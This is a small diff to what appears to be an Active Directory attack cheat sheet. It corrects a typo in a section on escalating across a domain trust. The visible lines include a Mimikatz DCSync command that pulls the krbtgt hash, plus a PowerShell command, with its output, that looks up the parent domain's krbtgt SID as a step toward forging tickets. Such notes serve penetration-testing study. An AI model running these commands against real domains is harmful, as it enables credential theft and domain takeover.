@@ -307,7 +307,7 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:marvel\krbtgt"
 ## Escalation Across Domain Trust
 Admin of child domain, krbtgt hash, access to DC
 
-Geting the sids of the parent domain 
+Getting the "sids" of the parent domain 
 ```
 PS C:\ad> (New-Object System.Security.Principal.NTAccount("disney.local","krbtgt")).Translate([System.Security.Principal.SecurityIdentifier]).Value
 S-1-5-21-493355955-4213530352-789496340-502
